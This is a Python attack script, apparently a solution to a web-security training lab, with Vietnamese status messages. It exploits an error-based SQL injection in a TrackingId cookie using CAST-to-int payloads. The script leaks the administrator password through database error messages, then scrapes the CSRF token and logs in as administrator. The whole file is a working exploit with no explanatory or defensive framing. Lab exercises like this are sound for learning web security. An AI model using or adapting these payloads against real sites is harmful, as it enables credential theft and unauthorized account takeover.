import requests
import re
from bs4 import BeautifulSoup

host = "YOUR_HOST"
path = "/filter?category=Pets"
login_url = "/login"

TrackingID_original = ""
Session_ID = "YOUR_SESSIONID"

s = requests.Session()

def make_request(payload):
    cookies = {
        "session": Session_ID,
        "TrackingId": TrackingID_original + payload
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
    }
    res = s.get("https://" + host + path, headers=headers, cookies=cookies)
    return res

print("[+] Đang tìm vị trí tài khoản administrator...")
p_u = 0
for x in range(1, 50):
    payload_position = f"' AND CAST((SELECT username FROM users LIMIT {x}) As int)=1 -- -"
    res = make_request(payload_position)
    
    if "administrator" in res.text:
        p_u = x
        print(f"[*] Tài khoản admin nằm tại hàng: {p_u}")
        break

if p_u == 0:
    print("[-] Không tìm thấy hàng của administrator.")
    exit()

print("[+] Đang lấy password qua thông báo lỗi...")
payload_find_password = f"' AND CAST((SELECT password FROM users LIMIT {p_u}) As int)=1 -- -"
res = make_request(payload_find_password)
match = re.search(r'invalid input syntax for type integer: "([^"]*)"', res.text)

if match:
    password_str = match.group(1)
    print(f"SUCCESS: Password của administrator là: {password_str}")
    print(f"[*] Đang lấy CSRF token...")
    res_get = s.get("https://" + host + login_url)
    soup = BeautifulSoup(res_get.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']

    login_data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": password_str
    }

    print(f"[*] Đang đăng nhập...")
    res_post = s.post("https://" + host + login_url, data=login_data)

    if "Log out" in res_post.text:
        print("THÀNH CÔNG: Bạn đã đăng nhập thành công!")
    else:
        print("[-] Đăng nhập thất bại. Kiểm tra lại password hoặc CSRF.")
else:
    print("[-] Không trích xuất được password từ phản hồi lỗi.")